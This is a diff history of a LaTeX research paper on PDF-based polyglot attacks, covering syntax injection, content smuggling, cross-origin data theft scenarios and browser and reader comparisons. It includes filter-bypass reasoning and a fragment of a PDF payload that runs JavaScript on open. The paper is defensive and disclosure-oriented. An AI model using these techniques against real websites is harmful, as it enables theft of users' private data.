+Based on the PDF samples in Listings~\ref{lst:minimal-pdf}, we can derive 
+the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
+pass through a sanitization filter unmodified, the set of tokens is $\{\%, <<, >>, /\}$.
+As can be noted, there is a small but significant overlap with the tokens of HTML, 
+which implies that many websites protected against cross-site scripting attacks 
+are also protected against PDF-based polyglot attacks. One of the problems of 
+filtering input for inclusion in a web page are the many contexts in which the 
+input can be included. A problem made even more complex by the diversity of 
+languages the page contains. Language incompatibilities force context dependent 
+filtering, where the same input is treated differently based on the context in 
+which it is included. In certain contexts angle brackets are often left untouched by filters.
+
+\paragraph{HTML comments}
+No HTML enclosed in comments, "<--" and "-->", will be rendered, and therefore 
+filters consider this context safe. To prevent input from escaping the comment by 
+injecting an end comment token, certain filters remove any occurrences of "-->", 
+but leave the of the input untouched. HTML comments are meaningless to PDF, 
+and the result is a valid HTML/PDF polyglot.
+
+\paragraph{JavaScript/CSS strings}
+
+\subsection{Content smuggling}
+
+Due to the nature of the PDF, it can without much effort be combined with just 
+about any other format. This provides ample opportunity to create malicious 
+polyglots where PDF is either the benign or the malicious format.
+
+\paragraph{PDF as the benign format}
+Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
+Before such PDF-files are published to recruiters, they are verified to not 
+contain any malicious payload. An attacker can produce a PDF that is valid and 
+benign, but also a polyglot hiding another malicious format, such as Flash. 
+A proof-of-concept can easily be created by storing the PDF as a static string 
+variable in the malicious flash source code. When the flash is compiled, the 
+source of the PDF is part of the output, making it a valid PDF.
+
+\paragraph{PDF as the malicious format}
+ Given the extensive capabilities of PDF, exploiting a content smuggling 
+vulnerability with a PDF-based polyglot attack, can be done without much effort.
+A server-side verification process will base its verification on the benign format,
+and is likely to miss the malicious PDF components. To prevent the attack, the 
+verification process have to actively search for and remove PDF specific syntax.
+
 \subsection{PDF communication methods}
 
-The embedded document will retain the origin from which it was served. Any 
+The embedded document will retain the origin from which it was served. All 
 request issued from the document will include any cookies available in the 
-browser for the target domain. This provides an attacker with the means to 
-perform actions in the name of an authenticated victim, i.e. Cross-Site Request 
-Forgery (CSRF). If the attacker can extract information, such as a CSRF-token, 
-the protection mechanism is defeated. \todo{this is describing another attack scenario, expand?}
-
+browser for the target domain.
 When embedded in a web page, many of the PDF communication methods utilize
 the underlying browser to make requests by navigating the browser to the target 
-URL. This will unload the current page in which the document is embedded. Page 
-navigation is allowed wtih respect to SOP, since the response is not visible 
+URL. This will unload the current page in which the document is embedded. Arbitrary page 
+navigation is allowed with respect to SOP, since the response is not visible 
 to the document. Such methods can be used in CSRF attacks, but would 
@@
 visible to the victim.
-
-\subsection{Syntax injection}
-
-Based on the minimal PDF sample in Listing~\ref{lst:minimal-pdf}, we can derive 
-the set of tokens required to build a PDF. Assuming that alpha-numeric characters pass through any filter unmodified, this set is ${\%, <<, >>, (, ), /}$.
-
-This means the required tokens that we need to be able to inject are: \%PDF-,
-trailer, <<, >> and /. The \%PDF and trailer token is usually no problem. From
-what I have seen, sometimes PDF is turned to lower case which prevents the
-attacks. Quite naturally, unless the site is vulnerable to traditional XSS, the
-<< and >> tokens are usually converted to \&lt; or some other encoding. The
-exception is in a JavaScript string context. In this context only </script> pose
-a threat, in case the < is not encoded this is usually prevented by escaping the
-slash:
-
-var s = 'user string</script>';
-
-This is bad from a PDF syntax point of view, because \\/Root is not valid. But
-</script> is only valid when the < is directly followed by /. So we can create a
-PoC which is not vulnerable to traditional XSS, where the injection is in a
-string and only </ is escaped, which will be vulnerable to PDF injection.
-
-\subsection{Content smuggling}
 

### 2012-12-03 main.tex
related work

@@
 First steps in exploiting the formats in the context of the web have
-been by researchers. Two noteworthy examples are GIFAR~\cite{XXX} and
-cross-origin CSS attacks~\cite{YYY} (Section~\ref{sec:related}
-discusses further realted work). 
+been by researchers. Two noteworthy examples are GIFAR~\cite{Brandis:GIFAR} and
+cross-origin CSS attacks~\cite{Huang+:CCS10} (Section~\ref{sec:related}
+discusses further related work). 
 %
@@
 
-\subsubsection{Syntax injection}
+\paragraph{Syntax injection}
 
@@
 provide trivial cross-origin leakage. The paper proposes a defense technique which has been
-adopted by all major browsers, which implies that the attacks outlined in the paper are now ineffective.
+adopted by all major browsers, which implies that the attacks outlined in their paper are now ineffective.
 Instead,
@@
 
-The Gifar attack is a polyglot attack based on content smuggling. In this attack 
+The GIFAR attack is a polyglot attack based on content smuggling. In this attack 
 a benign GIF-image and a malicious JAR-file is combined to create a GIF/JAR 
@@
 assumed target. A comparison between readers can be found in Section~\ref{sec:eval}.
+
+The reader is invited to visit the test page~\cite{Test:Page:12} for
+practical demonstration of the concepts from this section.
 
@@
 PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
-components can be omitted. The code in Listing~\ref{lst:minimal-pdf} shows the 
-minimal syntax required for a malformed, but valid PDF file.\todo{cite Julia Wolf?}
+components can be omitted~\cite{Wolf:CCC10}. The code in Listing~\ref{lst:minimal-pdf} shows the 
+minimal syntax required for a malformed, but valid PDF file.
 %incrementally 
@@
 
+As discussed in Section~\ref{sec:cross}, 
+GIFAR~\cite{Brandis:GIFAR} is based on polyglots that combine the GIF and JAR (Java
+archive) formats. The former is used as benign and the latter as
+malicious to bypass SOP. The Java virtual machine vendors have since
+then mitigated these attacks by patching the virtual machine to be
+more conservative on the format of the executed files.
+
+PDFAR~\cite{PDFAR:09} polyglots combine the PDF and JAR formats, where
+PDF serves as benign and JAR serves as malicious. Such a polyglot is
+possible due to the liberty of the requirements on the headers of PDF
+files. Mitigation against GIFAR attacks in the Java virtual machine
+effectively applies to PDFAR attacks.
+
 Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
@@
 
-Barth et al.~\cite{Barth+:SP09}
-
-Sundareswaran and Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10}
-
-Wolf~ OMG WTF PDF talk at CCC in 2010.
-
-PDFAR
+Barth et al.~\cite{Barth+:SP09} focus on security implications of
+content sniffing by browsers. They present content-sniffing XSS
+attacks by crossbreeding HTML with other formats like postscript. They
+show attacks on real systems like HotCRP, where an uploaded conference
+paper in the postscript format is interpreted as malicious HTML by the
+browser. They also propose a content-sniffing algorithm that does not
+suffer that helps defending against these class of attacks while
+maintaining compatibility.
+
+Sundareswaran and
+Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10} discuss image
+repurposing for GIFAR attacks. They present the AntiGifar tool for
+client-side protection. AntiGifar models the benign behavior of a user
+by a control-flow graph and detects possible anomalies when the
+interactions of the user and browser with the web site deviate from
+the control-flow model.
+
+As mentioned in Section~\ref{sec:cross}, Huang et
+al.~\cite{Huang+:CCS10} study an HTML/CSS attack. This attack injects
+fragments of CSS syntax in a HTML document, thereby making it a
+HTML/CSS polyglot. The error-tolerant parsing of style sheets allow
+the polyglot to parsed as valid CSS. The capabilities of CSS provide
+trivial cross-origin leakage. As discussed earlier, the paper's
+defense technique has been adopted by all major browsers, which
+implies that the attacks outlined in their paper are now ineffective.
+
+Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the main
+starting points for this work. The presentation explores the liberty
+of the PDF format. In addition, it highlights that PDF interpreters
+often disregard the specification demands. This particularly
+relevant as it allows crossbreeding PDF with such
+formats as ZIP and EXE.
+
+Heiderich et al.~\cite{Heiderich+:CCS11} explore the Scalable Vector
+Graphics (SVG) format. They discover attacks that allow SVG files,
+embedded via the \emph{img} tag, to run arbitrary JavaScript. 
+One of the
+attack vectors involves an SVG/HTML polyglot
+that behaves differently depending on the context in which it is
+accessed. When included in the \emph{img} tag, the file is interpreted as SVG,
+whereas when it is accessed directly it is interpreted as malicious HTML.
 
@@
 \bibliography{literature}
-
-\newpage
-\section*{Todo}
-Test page \url{http://internot.noads.biz} with Billy's and Jonas' anonymized demos?
-
 \end{document}

### 2012-12-03 main.tex
Section 4 Evaluation

@@
 
+This section details the evaluation performed to investigate the persistence of 
+the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
+instances of affected components, such as browsers and PDF interpreters, 
+content sanitization filter, and a study of the Alexa top 100 websites.
+
 \subsection{Instances}
@@
 
+\subsubsection{Readers}
+
+Section~\ref{sec:vuln} focus on the Adobe PDF Reader as the attack surface, 
+due to its standing as the most commonly used reader. To give a comparison, the 
+Google Chrome built-in PDF reader, was selected as it is the default reader to 
+user of the browser.
+
+As mentioned in Section~\ref{sec:cross}, the browser rely on the reader plug-in to 
+implement correct security measures, in order to prevent cross-domain leakage. 
+Unlike Adobe Reader, the Chrome browser built-in PDF reader refuses to render 
+content that was served with an inappropriate MIME-type if the content is 
+delivered across origins. This effectively prevents the attacks in Section~\ref{sec:vuln}.
+If the Chrome browser is configured to use the Adobe Reader plug-in, it will 
+behave the same as in other browsers and the content will be interpreted as PDF.
+
 \subsubsection{Browsers}
 
-Vulnerable: Firefox, Safari, Opera, Chrome
-
-Not vulnerable: Internet Explorer
-
-\subsubsection{Readers}
-
-\todo{see if this makes sense here}
-As it turns out, various browser plug-ins deal with the situation differently. The Chrome browser
-built-in PDF reader refuses to render content that was served with an inappropriate 
-MIME-type. If the 
-Chrome browser is configured to use the Adobe Reader plug-in, the behavior will 
-be the same as in other browsers and the content will be interpreted as PDF.
-The Java plug-in used to ignore the MIME-type, but after several 
-vulnerabilities were disclosed, this behavior was changed.
-
-Vulnerable: Adobe Reader
-
-Not vulnerable: Chrome PDF-viewer
-
-Not tested: Apple Preview
-
-\subsection{Bypassing content filters}
-
-\subsubsection{Server-side upload filters}
-
-Filter can verify that the benign file format is indeed benign without ever
-noticing the malicious file format hidden within.
-
-\subsubsection{Cross-site scripting filters}
-
-This effectively bypasses any cross-site scripting filters such as NoScript or
-filters built into browsers. Since the Reader plug-in handles the response, the
-browser never gets to see the content
-
-\subsubsection{Context sensitive filters}
-
-Clever filters that adapt their filtering to the context in which the user
-content is included. Basically filters that allow input that do not form harmfulHTML.
+The behavior of cross-domain embedding of PDF resources is studied in the major 
+browsers, i.e., Firefox, Safari, Opera, Google Chrome and Internet Explorer. 
+The study shows that all major browsers are susceptible to the attacks outlined 
+in Section~\ref{sec:vuln}, with some minor differences.
+
+\paragraph{Safari and Opera}
+The browsers, Safari and Opera, are both susceptible to the attacks outlined as 
+per Section~\ref{sec:vuln}, without any restrictions or modifications.
+
+\paragraph{Firefox}
+The Mozilla Firefox browser is susceptible to the attacks, with the restriction 
+that the PostMessage API is unavailable. This merely prevents one channel of 
+communication with the attacker, and does not reduce the threat.
+
+\paragraph{Internet Explorer}
+Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
+it seems to only support embedding of PDF documents using the \emph{embed} tag. 
+This is not a major obstacle in exploiting the vulnerability, as the embed and 
+object tags are interchangeable in this respect.
+
+\paragraph{Google Chrome}
+Google's browser, Chrome, has built-in support for displaying PDF documents. 
+The built-in PDF reader is used by default by the browser, unless it has been 
+explicitly disabled by the user. Certain complex PDF documents can not be 
+handled by the built-in reader. The built-in reader will then prompt the user 
+to open the document in Adobe Reader. As previously noted, the built-in reader 
+is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
+Reader plug-in is used to render the document.
+
+%\subsection{Bypassing content filters}
+
+%\subsubsection{Server-side upload filters}
+
+%As discussed in Section~\ref{sec:cross} server-side content filters that 
+%validate files based on content type are not equipped to handle polyglot 
+%content. For polyglot content, specialized filters are required that analyze 
+%the content based on all considerable interpretations of the content. No such 
+%filters were encountered in this study.
+
+%\subsubsection{Cross-site scripting filters}
+%\todo{install NoScript?}
+%This effectively bypasses any cross-site scripting filters such as NoScript or
+%filters built into browsers. Since the Reader plug-in handles the response, the
+%browser never gets to see the content
+
+%\subsubsection{Context sensitive filters}
+
+%Context sensitive cross-site scripting filters, that remove or encode characters
+%Clever filters that adapt their filtering to the context in which the user
+%content is included. Basically filters that allow input that do not form harmfulHTML.
+
+% Don't want to claim something I have no basis for..
 
@@
 
-To prevent PDF syntax injection attack, the task is simpler. As mentioned in Section~\ref{sec:vuln}, there is a limited 
-set of characters that are essential to create valid PDF syntax, namely \emph{'$<$', '$>$', and '/'}. Filtering 
-user input to remove or encode these characters effectively mitigates the vulnerability.
+To prevent PDF syntax injection attack, the task is simpler. As mentioned in 
+Section~\ref{sec:vuln}, there is a limited set of characters that are essential 
+to create valid PDF syntax, namely \emph{'$<$', '$>$', and '/'}. Filtering 
+user input to remove or encode these characters effectively mitigates the 
+vulnerability.
 

### 2012-12-03 main.tex
related work
Almost there.

@@
 security issues.
-\todo{explain the issues and cite Barth et al.~\cite{Barth+:SP09}}
-
-% Malicious polyglots in literature; gifar, chameleon, cross-origin css attacks
-\todo{
-In literature we find Content repurposing, content smuggling,
-chameleon, gifar; say that we have called it content smuggling
-ourselves in case someone discovers the blog
-}
+
+Barth et al.~\cite{Barth+:SP09} define \emph{chameleon} documents, 
+in which a benign file type crossbred with malicious HTML content. The document 
+is crafted in such a way that the content-sniffing algorithm used in the browser 
+will detect the content type as HTML. The paper proceeds to 
+describe how an attacker can create a 
+\emph{chameleon} document, that is valid PostScipt, but will be identified as HTML.
+This issue allows exploitation when there is a mismatch between a websites 
+content validation filter and the browsers content-sniffing algorithm.
+
+In literature we find, apart from chameleons, other names for similar,
+related concepts. Brandis~\cite{Brandis:GIFAR} refer \emph{GIFAR} 
+attacks, based on one of the early instances of attacks based on 
+GIF/JAR polyglots. 
+Sundareswaran et al.~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10}
+discuss GIFAR-related attacks as a form of \emph{content repurposing} attack. 
+In this paper the term content smuggling is used as it best represent 
+how a polyglot can infiltrate an origin.
 
@@
 
-According to the PDF specification \todo{cite specification} a PDF file is composed of
+According to the PDF specification~\cite{PDF:ISO08} a PDF file is composed of
 a header, several objects, a cross-reference section and a trailer. Listing~\ref{lst:sample-pdf} 
@@
 
+\todo{JavaScript/CSS/JSON context}
+
 \subsection{Content smuggling}
@@
 
-Alexa top 100 results
+A study to evaluate the prevalence of these issues was performed, 
+covering the Alexa top 100 websites. Because of their dominance 
+on the web, these websites are also the most exposed to security threats.
+The study covers PDF-based polyglot attacks using syntax injection as the infiltration method.
+The study did not cover polyglot attacks based on content smuggling, as 
+potential targets generally require authentication before submitting content.
+
+The study was conducted by supplying the websites with small benign samples 
+of PDF syntax, containing keywords and tokens, and examining the responses 
+for said tokens. The samples were benign strings containing  The conclusion is 
+that nine websites out of the hundred apply insufficient content filtering with 
+respect to the PDF format, which have the potential of compromising the 
+confidentiality and integrity of the website's users.
 

### 2012-12-03 main.tex
typos

@@
 completely separate, and isolated from the sensitive services. It also describes how 
-Google moved away from sanitizing content , as it was found to be insufficient in 
+Google moved away from sanitizing content, as it was found to be insufficient in 
 many cases.
@@
 content sniffing by browsers. They present content-sniffing XSS
-attacks by crossbreeding HTML with other formats like postscript. They
+attacks by crossbreeding HTML with other formats like PostScript. They
 show attacks on real systems like HotCRP, where an uploaded conference
-paper in the postscript format is interpreted as malicious HTML by the
+paper in the PostScript format is interpreted as malicious HTML by the
 browser. They also propose a content-sniffing algorithm that does not
@@
 
-Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the main
-starting points for this work. The presentation explores the liberty
+Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the 
+inspirations for our work. The presentation explores the liberty
 of the PDF format. In addition, it highlights that PDF interpreters

### 2012-12-03 main.tex
All text in\!

@@
 
-\paragraph{JavaScript/CSS strings}
-
-\todo{JavaScript/CSS/JSON context}
+\paragraph{JavaScript strings}
+In an in-line JavaScript context, user input is often included in the shape of a 
+JavaScript string, delimited by single or double quotes. In this context only a 
+few characters require encoding, as they can break the string context. Naturally, 
+any single or double quotes need escaping, as well as any carriage return or 
+line feed characters. In the spirit of making minimal changes to the input, 
+certain websites only these characters. This is sufficient to prevent cross-site 
+scripting attacks, but fail to protect against PDF-based polyglot attacks.
+
+Not only in-line JavaScript fall short in this regard. JavaScript object notation 
+(JSON) is used in modern websites as a data transport. This is particularly 
+common in websites that provide an API to interact with the offered services.
+JSON encoded information suffer the same problem as in-line JavaScript, thereby
+extending the attack surface further.
 

### 2012-12-03 main.tex
Figure: scenario added

@@
 
-\todo{diagram with attack scenario. for example: with example domains attacker.com and
-  vulnerable.com leaking secret file secret.txt}
 The victim in these scenarios is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
@@
 %interaction.
+
+\begin{figure}[h!]
+  \center
+  \includegraphics[width=0.49\textwidth]{scenario.png}
+  \caption{Overview of the scenario}
+  \label{fig:scenario}
+\end{figure}
 

### 2012-12-03 main.tex
Scenario polished

@@
 
-The victim in these scenarios is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
+The scenario, illustrated in Figure~\ref{fig:scenario}, describe how the attack proceed, from the infiltration of the origin, to the compromise of the victim.
+The victim in this scenario is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
 The target is infiltrated by the attacker, manipulating the website to serve polyglot content. Vulnerable.com serves the polyglot content as the benign content type, harmless to the victim. 

### 2012-12-03 main.tex
Extended scenario

@@
 severity of the consequences of exploitation.
+
+To give more context to the scenario, vulnerable.com can be a cloud storage service. 
+The attacker infiltrates the target by uploading a polyglot to the service and embed it 
+on attacker.com. While authenticated to vulnerable.com, the unsuspecting victim visits attacker.com, the embedded 
+polyglot is activated and extracts all the files stored in the victims account.
 

### 2012-12-03 main.tex
tweaks

--- 2012-12-03 main.tex
@@
 The victim in this scenario is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
-The target is infiltrated by the attacker, manipulating the website to serve polyglot content. Vulnerable.com serves the polyglot content as the benign content type, harmless to the victim. 
-At a certain point, while still authenticated to vulnerable.com, 
+The target is infiltrated by the attacker, manipulating the website to
+serve polyglot content. 
+The \emph{vulnerable.com} site serves the polyglot content as the benign content type, harmless to the victim. 
+At a certain point, while still authenticated to \emph{vulnerable.com}, 
 the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com}.
-The attacker.com website embeds the polyglot content from vulnerable.com, but
+The \emph{attacker.com} site embeds the polyglot content from \emph{vulnerable.com}, but
 coerces the browser to interpret it as the malicious content type. 
@@
 severity of the consequences of exploitation.
+
+To give more context to the scenario, \emph{vulnerable.com} can be a cloud storage service. 
+The attacker infiltrates the target by uploading a polyglot to the service and embed it 
+on \emph{attacker.com}. While authenticated to \emph{vulnerable.com}, the unsuspecting victim visits \emph{attacker.com}, the embedded 
+polyglot is activated and extracts all the files stored in the victims account.
 

### 2012-12-03 main.tex
Updated scenario

--- 2012-12-03 main.tex
@@
 
+Other potential targets for this scenario are job broker services and conference 
+submission systems, which by design allow submission of PDFs to be viewed by
+users.
+
 Two attacker-centric components requires special attention, the infiltration of 
@@
 
-Two vectors for infiltrating an origin has been identified, via syntax 
+In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more than one way
+This paper identifies two vectors for infiltrating an origin, via syntax 
 injection, or content smuggling.

### 2012-12-03 main.tex
tweaks

--- 2012-12-03 main.tex
@@
 \subsection{Alexa top 100}
-
-A study to evaluate the prevalence of these issues was performed, 
+We have conducted a
+study to evaluate the prevalence of the problem on popular sites, 
 covering the Alexa top 100 websites. Because of their dominance 
@@
 The study covers PDF-based polyglot attacks using syntax injection as the infiltration method.
-The study did not cover polyglot attacks based on content smuggling, as 
+It does not involve polyglot attacks based on content smuggling, as 
 potential targets generally require authentication before submitting content.
 
-The study was conducted by supplying the websites with small benign samples 
+The study is based on supplying the websites with small benign samples 
 of PDF syntax, containing keywords and tokens, and examining the responses 
-for said tokens. The samples were benign strings containing  The conclusion is 
+for said tokens. The samples are benign strings containing \todo{?}. The conclusion is 
 that nine websites out of the hundred apply insufficient content filtering with 
@@
 confidentiality and integrity of the website's users.
+%
+We are in contact with the teams responsible for the websites to help
+mitigate the vulnerabilities.
 

### 2012-12-03 main.tex
Minimal PDF sample updated

--- 2012-12-03 main.tex
@@
 a header, several objects, a cross-reference section and a trailer. Listing~\ref{lst:sample-pdf} 
-shows a sample of how a PDF file is structured and its elements.
+shows a sample of how a PDF file is structured and its elements. Supposedly, it is also a minimal PDF file according to the specification.
 
 \begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
-%PDF-1.7
-1 0 obj<</Type/Catalog/Pages<<>>>>
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog
+   /Outlines 2 0 R
+   /Pages 3 0 R
+>>
 endobj
-2 0 obj<</Length 13>>stream
-Sample Author
+2 0 obj
+<< /Type Outlines
+   /Count 0
+>>
+endobj
+3 0 obj
+<< /Type /Pages
+   /Kids [4 0 R]
+   /Count 1
+>>
+endobj
+4 0 obj
+<< /Type /Page
+   /Parent 3 0 R
+   /MediaBox [0 0 612 792]
+   /Contents 5 0 R
+   /Resources << /ProcSet 6 0 R >>
+>>
+endobj
+5 0 obj
+<< /Length 35 >>
+stream
+   ...Page-marking operators...
 endstream
 endobj
+6 0 obj
+   [/PDF]
+endobj
 xref
-0 3
-0000000000 65536 f
+0 7
+0000000000 65535 f
 0000000009 00000 n
-0000000057 00000 n
-trailer<</Root 1 0 R
-	/Info<</Author 2 0 R>>
+0000000074 00000 n
+0000000120 00000 n
+0000000179 00000 n
+0000000300 00000 n
+0000000384 00000 n
+trailer
+<< /Size 7
+   /Root 1 0 R
 >>
 startxref
-118
+408
 %%EOF

### 2012-12-03 main.tex
Scenario fix

@@
 The victim in this scenario is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
-The target is infiltrated by the attacker, manipulating the website to
+The target is infiltrated by the attacker (1), manipulating the website to
 serve polyglot content. 
@@
 At a certain point, while still authenticated to \emph{vulnerable.com}, 
-the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com}.
-The \emph{attacker.com} site embeds the polyglot content from \emph{vulnerable.com}, but
-coerces the browser to interpret it as the malicious content type. 
+the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com} (2).
+The \emph{attacker.com} site embeds the polyglot content from \emph{vulnerable.com} (3), but
+coerces the browser to interpret it as the malicious content type (4). 
 The capabilities of the malicious format determine the 
-severity of the consequences of exploitation.
+severity of the consequences of exploitation (5).
 
@@
 %\subsection{Embedded PDF documents}
-%\todo{Not sure how well it fits here}
+
 When a PDF document is embedded in a web page, the corresponding plugin 
@@
 of PDF syntax, containing keywords and tokens, and examining the responses 
-for said tokens. The samples are benign strings containing \todo{?}. The conclusion is 
+for said tokens. The conclusion is 
 that nine websites out of the hundred apply insufficient content filtering with 

### 2012-12-03 main.tex
Final tidying up

@@
 	URL+'">]><foo>&x;</foo>'
-app.alert(XMLData.parse(xml).saveXML())
+var doc = XMLData.parse(xml);
+app.alert(doc.saveXML())
 endstream
-trailer<</Root<</Pages<<>>
-    /OpenAction<</S/JavaScript/JS 1 0 R>>
+trailer<</Root
+   <</Pages<<>>
+      /OpenAction
+      <</S/JavaScript/JS 1 0 R>>
    >>
@@
 
-How this problem presents itself in various instances of browsers and readers.
+To better understand the how this problem presents itself, a comparison of browser and reader instances 
+is presented. We compare all major browsers and two of the most common readers.
 

### 2013-02-06 main.tex
Some updates on the todo list

@@
 
-First steps in exploiting the formats in the context of the web have
-been by researchers. Two noteworthy examples are GIFAR~\cite{Brandis:GIFAR} and
+The first steps in exploiting formats in the context of the web have
+been taken by researchers. Two noteworthy examples are GIFAR~\cite{Brandis:GIFAR} and
 cross-origin CSS attacks~\cite{Huang+:CCS10} (Section~\ref{sec:related}
@@
 and it is up to the plug-in to respond to and handle the content it is served. While the containing page is restricted 
-from directly accessing the content handled by the plug-in, a number of plugins provide 
+from directly accessing the content handled by the plug-in, a number of plug-ins provide 
 an API for interacting with the plug-in and the data. As we will show, this can lead to 
@@
 A polyglot is composed from various constructs that are either common between
-languages; or constructs that are language specific, but carrying different
+languages; or constructs that are language specific but carrying different
 meaning in each language. To maintain validity across languages, one must ensure
@@
 describe how an attacker can create a 
-\emph{chameleon} document, that is valid PostScipt, but will be identified as HTML.
+\emph{chameleon} document, that is valid PostScript, but will be identified as HTML.
 This issue allows exploitation when there is a mismatch between a websites 
@@
 In literature we find, apart from chameleons, other names for similar,
-related concepts. Brandis~\cite{Brandis:GIFAR} refer \emph{GIFAR} 
+related concepts. Brandis~\cite{Brandis:GIFAR} refer to \emph{GIFAR} 
 attacks, based on one of the early instances of attacks based on 
@@
 discuss GIFAR-related attacks as a form of \emph{content repurposing} attack. 
-In this paper the term content smuggling is used as it best represent 
+In this paper the term content smuggling is used as it best represents 
 how a polyglot can infiltrate an origin.
 
-\subsection{Scenario}
+Two attacker-centric components require special attention, the infiltration of 
+an origin and the exploitation of an infiltrated origin.
+%In this situation, the same-origin policy is intended to prevent cross-origin 
+%interaction.
+
+\subsection{Attack vectors}
+
+In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more than one way.
+This paper identifies two vectors for infiltrating an origin, via syntax 
+injection, or content smuggling.
+
+\subsubsection{Syntax injection}
+
+In a cross-site scripting attack, an HTML document is composed from input 
+containing fragments of HTML syntax, causing the execution of attacker supplied 
+script code. Similarly, in a syntax injection attack the vulnerable target will 
+compose content from attacker controlled input containing syntax of a foreign 
+format, thereby creating a polyglot. 
+%
+The target is assumed to employ server-side cross-site scripting sanitization. Hence, for the attack to be successful, the input must 
+bypass this sanitization. The sanitization filter will remove or encode 
+problematic characters, based on the context of the web application. In a polyglot attack
+the injected format would pose as a new context, unknown to the filter. Chances are that the 
+key elements of the injected format will pass the filter unaltered. 
+The polyglot content can
+be interpreted as either the benign original format or the
+malicious attacker-supplied format. 
+%
+
+%As an example the
+%same-origin policy allows a \emph{script} tag in one document to include JavaScript of
+%another origin and execute it in the origin of the document. If an attacker is
+%able to inject an HTML document with JavaScript syntax in such a way that it
+%became valid JavaScript, the attacker can include the document across origins
+%via a \emph{script} tag and extract its content, thereby circumventing the same-origin
+%policy.
+
+%The document in Listing \ref{lst:html-js}, is both
+%malformed but valid HTML and valid JavaScript in browsers that support
+%EcmaScript for XML (E4X). \todo{ref} The
+%document can be included as a script in another document and the secret can be
+%extracted from variable x. 
+%This implies that if an attacker is able to inject
+%HTML syntax into a document, closing all previously open tags and
+%opening all subsequently closed tags,
+%then information can be extracted across origins.
+%The injected syntax in the listing is illustrated by highlighting.
+
+%This attack has been suggested as a potential way to bypass Content Security
+%Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
+%engine, used in Firefox, this limits the exploitability of this example. However,
+%this is an unlikely scenario to use JavaScript as the injected format
+%because HTML characters are typically escaped by content
+%filters.
+
+\begin{figure}[h!]
+  \center
+  \includegraphics[width=0.49\textwidth]{injection-scenario.png}
+  \caption{Overview of the syntax injection scenario}
+  \label{fig:scenario}
+\end{figure}
+
+Previous work documents instances of polyglot attacks based on syntax injection.
+Huang et al.~\cite{Huang+:CCS10} describe a cross-origin \emph{cascading style-sheet} (CSS) attack. This 
+attack injects fragments of CSS syntax in a HTML 
+document, thereby making it a HTML/CSS polyglot. The error-tolerant parsing of 
+style sheets allow the polyglot to parsed as valid CSS. The capabilities of CSS 
+provide trivial cross-origin leakage. The paper proposes a defense technique which has been
+adopted by all major browsers, which implies that the attacks outlined in their paper are now ineffective.
+Instead,
+Section
+\ref{sec:vuln} will show practical attacks based on other formats.
+
+%\definecolor{lightgray}{gray}{.8}
+%\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot, escapechar=*]
+%<html><body>
+%Hello *\colorbox{lightgray}{$<$/body$><$/html$>$;x=$<$html$><$body$>$}*!
+%Your secret is 'safe with me'.
+%</body></html>
+%\end{lstlisting}
+
+\subsubsection{Content smuggling}
+The vulnerable target of a polyglot attack, based on content smuggling, lets 
+users to submit files to the service which are subsequently served under the origin of 
+the service. Examples of such services are file sharing services, image databases, 
+social networks or job broker services. Such a service 
+accepts a limited set of file-types, and the files are verified to
+be of one of these types, e.g. an image, before being served to the end
+user. By submitting a polyglot to such a service, an attacker can trick the
+service into serving malicious content under the origin of the service. The
+service will verify the file, assuming that it is of the benign format, but once
+the content is served an attacker can coerce the content to be interpreted as
+the malicious format.
+
+The GIFAR attack is a polyglot attack based on content smuggling. In this attack 
+a benign GIF-image and a malicious JAR-file is combined to create a GIF/JAR 
+polyglot. By submitting the combined GIFAR to a service, the attacker can 
+execute a Java applet under the origin of the targeted service. The Java runtime 
+has been updated to prevent this kind of abuse.
+Instead,
+Section
+\ref{sec:vuln} will show practical attacks based on other formats.
+
+\paragraph{Scenario}
 
@@
 
-Two attacker-centric components requires special attention, the infiltration of 
-an origin and the exploitation of an infiltrated origin.
-%In this situation, the same-origin policy is intended to prevent cross-origin 
-%interaction.
-
 \begin{figure}[h!]
   \center
-  \includegraphics[width=0.49\textwidth]{scenario.png}
-  \caption{Overview of the scenario}
+  \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
+  \caption{Overview of the content smuggling scenario}
   \label{fig:scenario}
@@
 
-\subsection{Infiltrating an origin}
-
-In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more than one way
-This paper identifies two vectors for infiltrating an origin, via syntax 
-injection, or content smuggling.
-
-\paragraph{Syntax injection}
-
-In a cross-site scripting attack, a HTML document is composed from input 
-containing fragments of HTML syntax, causing the execution of attacker supplied 
-script code. Similarly, in a syntax injection attack the vulnerable target will 
-compose content from attacker controlled input containing syntax of a foreign 
-format, thereby creating a polyglot. 
-%
-The target is assumed to employ server-side cross-site scripting sanitization. Hence, for the attack to be successful, the input must 
-bypass this sanitization. The sanitization filter will remove or encode 
-problematic characters, based on the context of the web application. In a polyglot attack
-the injected format would pose as a new context, unknown to the filter. Chances are that the 
-key elements of the injected format will pass the filter unaltered. 
-The polyglot content can
-be interpreted as either the benign original format or the
